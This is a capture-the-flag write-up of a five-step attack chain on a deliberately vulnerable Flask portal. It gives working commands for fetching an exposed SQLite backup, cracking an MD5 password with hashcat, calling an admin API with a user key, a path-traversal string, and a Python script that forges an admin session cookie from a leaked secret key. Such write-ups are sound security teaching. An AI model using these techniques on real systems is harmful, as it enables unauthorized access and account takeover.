# InvestiGate Portal 1-5

> Category: Web Portal Offensive. Event: SANS European Championship 2026.

This was a five flag chain in one Flask app. Not one big 0day thing, more like death by small bad decisions.

Flags:

```text
mne{b4ck_robotT0_th3_b4sic5}
mne{sm4ll_things_b1g_consqu3nce5}
mne{r4ad1ng_s0urce_n3v3r_hurt5}
mne{k33p_y0ur_l0gs_cl0s3_but_n0t_th4t_cl0s3}
mne{d0nt_dr0p_y0ur_k3ys}
```

## Files

The useful local files are now in [files/](files/).

- [files/MANIFEST.md](files/MANIFEST.md) has the full list
- `files/portal-1/artifacts/` has `users.bak`, `app.py`, hashes, cracked output, evidence, and the Flask cookie forge
- `files/portal-1/original/` through `files/portal-5/original/` have the prompts and flags
- yes, this includes the toy CTF keys from the vulnerable Flask app; dont treat those like real infra secrets

## Portal 1 - robots.txt

The first flag was basically "please look at robots". I did:

```bash
curl https://target/robots.txt
```

Output had:

```text
User-agent: *
Disallow: /tmpfiles/all

FLAG1: mne{b4ck_robotT0_th3_b4sic5}
```

That also gave the next path. Nice when the challenge drives itself.

## Portal 2 - backup DB

`/tmpfiles/all` exposed a directory listing. In there was:

```text
backup/users.bak
```

It was SQLite:

```bash
file users.bak
sqlite3 users.bak ".schema"
sqlite3 users.bak "select username,password,role,FLAG from users;"
```

The `users` table had a dev row with the flag and an MD5 password:

```text
dev : 18a7763dbf76f40177acbfda65e84214 : user : mne{sm4ll_things_b1g_consqu3nce5}
```

Hashcat ate it fast:

```bash
hashcat -m 0 hashes.txt rockyou.txt
```

Password was:

```text
samtheman
```

## Portal 3 - read the JS like a adult

Logged in as `dev:samtheman`. The profile page loaded JS files. I opened `/static/api.js`, because front-end files love leaking dumb stuff.

At the bottom:

```js
// FLAG3: mne{r4ad1ng_s0urce_n3v3r_hurt5}
```

No exploit, just reading. Painfully effective.

## Portal 4 - flag in a header

There was an admin API JS file with endpoints. One endpoint was `/api/admin/getLogs`.

The funny bug: it was "admin" by name but accepted a normal user API key. So:

```bash
curl -i -b cookies.txt \
  -H "API-Key: <dev-api-key>" \
  https://target/api/admin/getLogs
```

The flag was not in the body. It was in the response header:

```http
flag4: mne{k33p_y0ur_l0gs_cl0s3_but_n0t_th4t_cl0s3}
```

I almost missed it becouse I was looking at the body like a fool.

## Portal 5 - Flask cookie forge

The logs were worse than the header flag. They leaked the Flask `SECRET_KEY` over and over:

```text
signed with key: 'GVhVLraKTxXEHHWArrLp'
```

Once you have Flask secret key, you can sign your own session cookie. This was the little forge:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.config["SECRET_KEY"] = "GVhVLraKTxXEHHWArrLp"

ser = SecureCookieSessionInterface().get_signing_serializer(app)
print(ser.dumps({
    "logged_in": True,
    "username": "admin",
    "usertype": "administrator",
}))
```

Use forged cookie, grab admin API key, then:

```bash
curl -b "session=<forged-cookie>" \
  -H "API-Key: <admin-api-key>" \
  https://target/api/admin/getFlag
```

And:

```text
Well done, here is your FLAG5: mne{d0nt_dr0p_y0ur_k3ys}
```

## Bonus dumbness

There was also path traversal in the temp listing:

```text
/tmp/%2e%2e/app.py
```

That gave source. But honestly the app already leaked enough stuff without needing to be fancy.

## Why it worked

Each bug was small:

- sensitive path in `robots.txt`
- backup database in web root
- flag comment in JS
- user API key accepted on admin endpoint
- session signing key leaked in logs

Together it became a clean chain. This is why boring hygiene matters. One leak is bad, five leaks is a free weekend CTF solve.
